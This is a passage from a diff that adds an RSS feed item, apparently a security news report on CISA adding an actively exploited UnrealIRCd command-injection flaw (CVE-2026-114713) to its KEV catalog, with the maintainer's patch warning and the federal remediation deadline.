+&lt;p&gt;"The labeled-response module in UnrealIRCd 6.0.0 before 6.2.7.1 does not escape the IRCv3 'label' message tag when echoing it into replies, which allows any user on a network with two or more linked servers to inject server-to-server commands that are executed with server authority," reads the &lt;a href="https://nvd.nist.gov/vuln/detail/cve-2026-114713" target="_blank"&gt;description&lt;/a&gt; of the flaw in the NIST National Vulnerability Database (NVD).&lt;/p&gt;
+&lt;p&gt;The addition comes nearly a week after UnrealIRCd's project leader, developer, and maintainer, Bram Matthys (aka Syzop), released UnrealIRCd 6.2.7.1 to address multiple security vulnerabilities identified with the help of artificial intelligence, including CVE-2026-114713.&lt;/p&gt;
+&lt;!--adsense--&gt;
+&lt;p&gt;"We are seeing bad guys exploiting this issue on the internet right now," Matthys &lt;a href="https://forums.unrealircd.org/viewtopic.php?t=9487" target="_blank"&gt;said&lt;/a&gt;. "Hopefully everyone has hot-patched or updated their server, or at the very least has the spamfilter workaround deployed. If not, do so ASAP!"&lt;/p&gt;
+&lt;p&gt;Exploitation attempts are said to have commenced a day after the release of the hotfix on November 7, 2026. That said, the exact details of the malicious activity and its end goals are presently unknown. The maintainer described the vulnerability as the "most critical issue" found in UnrealIRCd over the past 15 years.&lt;/p&gt;
+&lt;p&gt;Federal Civilian Executive Branch (FCEB) agencies have time until November 16, 2026, to apply the fixes under Binding Operational Directive (BOD) 26-04: Prioritizing Security Updates Based on Risk.&lt;/p&gt;</description>
+      <content:encoded>&lt;div class="separator" style="clear: both;"&gt;&lt;a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjuvSsWcsJ9736KXp_0s-6__-CiI5PD71VReembVHAB4cfnv3Qti8td9WR54UnRH96bz30dvbTQxwG3WbxDkWRq_eFJPYLgxbAzRD5k3MJSISbW2VDI-Fr7nlX4j8NyJkXqLHylMZMXpynEHVV8ovZ2YPC-WGCFCcrOZOeGc5Wsy-jRjjbcyYTzojI9Nudw/s1600/cisaa.jpg" style="display: block; padding: 1em 0; text-align: center; clear: left; float: left;"&gt;&lt;img alt="" border="0" data-original-height="470" data-original-width="900" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjuvSsWcsJ9736KXp_0s-6__-CiI5PD71VReembVHAB4cfnv3Qti8td9WR54UnRH96bz30dvbTQxwG3WbxDkWRq_eFJPYLgxbAzRD5k3MJSISbW2VDI-Fr7nlX4j8NyJkXqLHylMZMXpynEHVV8ovZ2YPC-WGCFCcrOZOeGc5Wsy-jRjjbcyYTzojI9Nudw/s1600/cisaa.jpg" style="width:auto;height:auto;max-width:100%;max-height:450px;object-fit:contain;display:block;border-radius:4px;" loading="lazy" /&gt;&lt;/a&gt;&lt;/div&gt;
+&lt;p&gt;The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Friday &lt;a href="https://www.cisa.gov/news-events/alerts/2026/11/13/cisa-adds-two-known-exploited-vulnerabilities-catalog" target="_blank"&gt;added&lt;/a&gt; a high-severity security flaw impacting UnrealIRCd, an open-source Internet Relay Chat (IRC) server, to its Known Exploited Vulnerabilities (&lt;a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" target="_blank"&gt;KEV&lt;/a&gt;) catalog, following reports of active exploitation.&lt;/p&gt;
+&lt;p&gt;The vulnerability, tracked as CVE-2026-114713 (CVSS score: 8.6), is a case of improper neutralization of delimiters that could be used to execute arbitrary commands with server/IRCOp privileges.&lt;/p&gt;
+&lt;p&gt;"The labeled-response module in UnrealIRCd 6.0.0 before 6.2.7.1 does not escape the IRCv3 'label' message tag when echoing it into replies, which allows any user on a network with two or more linked servers to inject server-to-server commands that are executed with server authority," reads the &lt;a href="https://nvd.nist.gov/vuln/detail/cve-2026-114713" target="_blank"&gt;description&lt;/a&gt; of the flaw in the NIST National Vulnerability Database (NVD).&lt;/p&gt;
+&lt;p&gt;The addition comes nearly a week after UnrealIRCd's project leader, developer, and maintainer, Bram Matthys (aka Syzop), released UnrealIRCd 6.2.7.1 to address multiple security vulnerabilities identified with the help of artificial intelligence, including CVE-2026-114713.&lt;/p&gt;
+&lt;!--adsense--&gt;
+&lt;p&gt;"We are seeing bad guys exploiting this issue on the internet right now," Matthys &lt;a href="https://forums.unrealircd.org/viewtopic.php?t=9487" target="_blank"&gt;said&lt;/a&gt;. "Hopefully everyone has hot-patched or updated their server, or at the very least has the spamfilter workaround deployed. If not, do so ASAP!"&lt;/p&gt;
+&lt;p&gt;Exploitation attempts are said to have commenced a day after the release of the hotfix on November 7, 2026. That said, the exact details of the malicious activity and its end goals are presently unknown. The maintainer described the vulnerability as the "most critical issue" found in UnrealIRCd over the past 15 years.&lt;/p&gt;
+&lt;p&gt;Federal Civilian Executive Branch (FCEB) agencies have time until November 16, 2026, to apply the fixes under Binding Operational Directive (BOD) 26-04: Prioritizing Security Updates Based on Risk.&lt;/p&gt;</content:encoded>
+      <guid isPermaLink="false">https://thehackernews.com/2026/11/attackers-exploit-unrealircd-flaw-that.html</guid>
+      <category>cyber</category>
+      <pubDate>Sat, 14 Nov 2026 18:08:35 +0530</pubDate>
     </item>
   <sy:updatePeriod>hourly</sy:updatePeriod><sy:updateFrequency>1</sy:updateFrequency><atom:link href="https://pubsubhubbub.appspot.com/" rel="hub" /></channel>
 </rss>
